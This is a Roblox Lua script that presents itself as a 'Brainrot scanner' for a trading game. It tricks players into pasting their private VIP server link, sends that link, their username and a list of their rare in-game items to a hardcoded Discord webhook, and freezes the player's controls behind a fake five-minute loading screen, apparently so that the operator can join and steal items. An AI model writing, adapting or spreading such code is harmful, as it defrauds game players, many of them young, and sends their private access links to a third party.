local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")

-- =============================
-- Конфиг
-- =============================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
local DEFAULT_MESSAGE_CONTENT = "@everyone Attention — automatic report (example)."

-- =============================
-- Глобальные переменные
-- =============================
local isActivated = false
local activationGUI = nil
_G.VIP_LINK = nil

-- =============================
-- Блокировка игрока
-- =============================
local function lockPlayerControls(lock)
	local player = Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()

	-- отключаем стандартные контролы
	local Controls = require(player:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls()
	if lock then
		Controls:Disable()
	else
		Controls:Enable()
	end

	-- скрываем/возвращаем хотбар
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, not lock)

	-- убираем инструменты из рук
	if lock then
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if humanoid then
			humanoid:UnequipTools()
		end
	end
end

-- =============================
-- Утилиты
-- =============================
local function color3ToInt(c)
	if typeof(c) ~= "Color3" then return 0 end
	local r = math.floor(c.R * 255 + 0.5)
	local g = math.floor(c.G * 255 + 0.5)
	local b = math.floor(c.B * 255 + 0.5)
	return r * 65536 + g * 256 + b
end

local function sendRawWebhookJson(json)
	local reqfn = request or (syn and syn.request) or (http and http.request) or http_request or (function() return nil end)
	if type(reqfn) == "function" then
		local ok, err = pcall(function()
			reqfn({
				Url = WEBHOOK_URL,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = json,
			})
		end)
		if ok then return true end
	end

	local ok, res = pcall(function()
		return HttpService:RequestAsync({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = {["Content-Type"] = "application/json"},
			Body = json,
		})
	end)
	if ok and res and res.Success then
		return true
	end
	return false
end

local function sendDiscordWebhook(content, embed)
	if not WEBHOOK_URL or WEBHOOK_URL == "" then return false end
	local payload = {}
	if content and #content > 0 then payload.content = content end
	if embed then
		if embed.color and typeof(embed.color) == "Color3" then
			embed.color = color3ToInt(embed.color)
		end
		payload.embeds = { embed }
	end
	local ok, json = pcall(function() return HttpService:JSONEncode(payload) end)
	if not ok then return false end
	return sendRawWebhookJson(json)
end

local function postDiscordSimple(content)
	if not content or content == "" then return end
	local MAX = 1800
	local i = 1
	while i <= #content do
		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
		sendDiscordWebhook("```" .. chunk .. "```", nil)
		i = i + MAX
	end
end

-- =============================
-- Brainrots (пример)
-- =============================
local CANONICAL_BRAINROT_NAMES = {
	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot","Job Job Job Sahur",
}
local LOWER_TO_CANON = {}
for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
	LOWER_TO_CANON[string.lower(name)] = name
end
local function safeLower(str) if typeof(str) ~= "string" then return "" end return string.lower(str) end
local function stringContainsAny(haystack, needles)
	haystack = safeLower(haystack)
	for _, needle in ipairs(needles) do
		if string.find(haystack, needle, 1, true) then return true end
	end
	return false
end
local function getCanonicalMatch(name)
	local lname = safeLower(name)
	for lowerCanonical, canonical in pairs(LOWER_TO_CANON) do
		if string.find(lname, lowerCanonical, 1, true) then
			return canonical
		end
	end
	return nil
end
local ALLOW_CATEGORY_KEYWORDS = {"brainrot god","secret","og","admin","exclusive","taco","craft machine","fuse machine","los ","las ","ritual","unobtainable","removed","upcoming"}
local DISALLOW_CATEGORY_KEYWORDS = {"common","rare","epic","legendary","mythic","mythic lucky block"}
local function isAllowedByCategory(name)
	local lname = safeLower(name)
	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
	local hasAllow = stringContainsAny(lname, ALLOW_CATEGORY_KEYWORDS)
	if hasDisallow and not hasAllow then return false end
	return true
end
local function isBrainrotInstance(inst)
	if not inst then return false end
	local canonical = getCanonicalMatch(inst.Name)
	if not canonical then return false end
	if not isAllowedByCategory(inst.Name) then return false end
	return true
end
local function resolveOwnerNameFromPlot(plot)
	for _, d in ipairs(plot:GetDescendants()) do
		if d:IsA("StringValue") and stringContainsAny(d.Name, {"owner","username","user"}) then
			if d.Value and #d.Value > 0 then return d.Value end
		end
		if d:IsA("IntValue") and stringContainsAny(d.Name, {"owner","userid"}) then
			local ok, name = pcall(function() return Players:GetNameFromUserIdAsync(d.Value) end)
			if ok and name then return name end
		end
	end
	return nil
end
local function collectBrainrotsInPlot(plot)
	local results, seenCanonical = {}, {}
	for _, d in ipairs(plot:GetDescendants()) do
		if isBrainrotInstance(d) then
			local canonical = getCanonicalMatch(d.Name) or d.Name
			if not seenCanonical[canonical] then
				seenCanonical[canonical] = true
				table.insert(results, { name = canonical })
			end
		end
	end
	return results
end
local function buildPlotSection(plot)
	local ownerName = resolveOwnerNameFromPlot(plot)
	local entries = collectBrainrotsInPlot(plot)
	if #entries == 0 then return nil end
	local lines = {}
	local plotLabel = ownerName and ownerName or plot.Name
	table.insert(lines, string.format("Плот: %s | найдено: %d", plotLabel, #entries))
	for i, e in ipairs(entries) do
		table.insert(lines, string.format("#%d %s", i, e.name))
	end
	return table.concat(lines, "\n")
end

-- =============================
-- Отчёт и мониторинг
-- =============================
local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
local connections, batchScheduled = {}, false
local function scheduleBatch()
	if batchScheduled then return end
	batchScheduled = true
	task.delay(0.5, function()
		batchScheduled = false
		local sections = {}
		for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
			local section = buildPlotSection(plot)
			if section then table.insert(sections, section) end
		end
		if #sections > 0 then
			postDiscordSimple(table.concat(sections, "\n\n"))
		end
	end)
end
local function onPlotDescendantAdded(plot, inst) if isBrainrotInstance(inst) then scheduleBatch() end end
local function attachPlotWatch(plot)
	if connections[plot] then return end
	connections[plot] = plot.DescendantAdded:Connect(function(inst) onPlotDescendantAdded(plot, inst) end)
end
local function detachPlotWatch(plot)
	if connections[plot] then connections[plot]:Disconnect() connections[plot] = nil end
end
local function watchPlots()
	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do attachPlotWatch(plot) end
	PLOTS_FOLDER.ChildAdded:Connect(function(child) attachPlotWatch(child) scheduleBatch() end)
	PLOTS_FOLDER.ChildRemoved:Connect(function(child) detachPlotWatch(child) scheduleBatch() end)
end

-- =============================
-- Экран загрузки
-- =============================
local function showLoadingScreen()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "LoadingScreen"
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	-- при экране загрузки тоже блокируем
	lockPlayerControls(true)

	local bg = Instance.new("Frame")
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	bg.BorderSizePixel = 0
	bg.Parent = gui

	local label = Instance.new("TextLabel")
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.Position = UDim2.new(0.5, 0, 0.4, 0)
	label.Size = UDim2.new(0.8, 0, 0.1, 0)
	label.BackgroundTransparency = 1
	label.Text = "Loading Script..."
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.TextScaled = true
	label.Font = Enum.Font.GothamBold
	label.Parent = bg

	local barBg = Instance.new("Frame")
	barBg.AnchorPoint = Vector2.new(0.5, 0.5)
	barBg.Position = UDim2.new(0.5, 0, 0.55, 0)
	barBg.Size = UDim2.new(0.6, 0, 0.05, 0)
	barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	barBg.BorderSizePixel = 0
	barBg.Parent = bg
	local corner1 = Instance.new("UICorner")
	corner1.CornerRadius = UDim.new(0, 8)
	corner1.Parent = barBg

	local barFill = Instance.new("Frame")
	barFill.Size = UDim2.new(0, 0, 1, 0)
	barFill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
	barFill.BorderSizePixel = 0
	barFill.Parent = barBg
	local corner2 = Instance.new("UICorner")
	corner2.CornerRadius = UDim.new(0, 8)
	corner2.Parent = barFill

	local tween = TweenService:Create(barFill, TweenInfo.new(300, Enum.EasingStyle.Linear), { Size = UDim2.new(1, 0, 1, 0) })
	tween:Play()

	task.delay(300, function()
		-- возвращаем управление после экрана загрузки
		lockPlayerControls(false)
		gui:Destroy()
	end)
end

-- =============================
-- GUI активации
-- =============================
local function createActivationGUI()
	local player = Players.LocalPlayer
	local gui = Instance.new("ScreenGui")
	gui.Name = "BrainrotScannerActivation"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	-- при открытии блокируем управление
	lockPlayerControls(true)

	local mainFrame = Instance.new("Frame")
	mainFrame.Size = UDim2.new(0, 450, 0, 300)
	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
	mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	mainFrame.Parent = gui
	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 15)
	corner.Parent = mainFrame

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -20, 0, 50)
	title.Position = UDim2.new(0, 10, 0, 10)
	title.BackgroundTransparency = 1
	title.Text = "Place VIP server link to activate script"
	title.TextColor3 = Color3.fromRGB(255, 255, 255)
	title.TextScaled = true
	title.Font = Enum.Font.GothamBold
	title.Parent = mainFrame

	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(1, -20, 0, 50)
	textBox.Position = UDim2.new(0, 10, 0, 70)
	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
	textBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
	textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
	textBox.TextScaled = true
	textBox.Font = Enum.Font.Gotham
	textBox.ClearTextOnFocus = false
	textBox.Parent = mainFrame
	local textCorner = Instance.new("UICorner")
	textCorner.CornerRadius = UDim.new(0, 8)
	textCorner.Parent = textBox

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -20, 0, 70)
	button.Position = UDim2.new(0, 10, 0, 140)
	button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
	button.Text = "ACTIVATE"
	button.TextColor3 = Color3.new(1, 1, 1)
	button.TextScaled = true
	button.Font = Enum.Font.GothamBold
	button.Parent = mainFrame
	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 12)
	btnCorner.Parent = button

	local status = Instance.new("TextLabel")
	status.Size = UDim2.new(1, -20, 0, 30)
	status.Position = UDim2.new(0, 10, 0, 220)
	status.BackgroundTransparency = 1
	status.Text = ""
	status.TextColor3 = Color3.fromRGB(255, 200, 0)
	status.TextScaled = true
	status.Font = Enum.Font.Gotham
	status.Parent = mainFrame

	local function onActivate()
		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
			status.Text = "Not a VIP link"
			status.TextColor3 = Color3.fromRGB(255, 80, 80)
			return
		end

		isActivated = true
		_G.VIP_LINK = vipLink
		status.Text = "Script Activated, wait for modules"
		status.TextColor3 = Color3.fromRGB(0, 255, 100)

		sendDiscordWebhook("🔗 VIP Link: "..vipLink, {
			title = "⭐ Brainrots | Elliot",
			description = "Base: ".. tostring(Players.LocalPlayer and Players.LocalPlayer.Name or "unknown"),
			color = Color3.fromRGB(0,255,0),
		})

		task.wait(1)
		postDiscordSimple("Brainrots: ")
		watchPlots()

		task.wait(2)
		gui:Destroy()
		activationGUI = nil

		-- запускаем экран загрузки
		showLoadingScreen()
	end

	button.MouseButton1Click:Connect(onActivate)
	textBox.FocusLost:Connect(function(enterPressed) if enterPressed then onActivate() end end)
end

-- =============================
-- Старт
-- =============================
print("[BrainrotScanner] Создаю GUI активации...")
createActivationGUI()
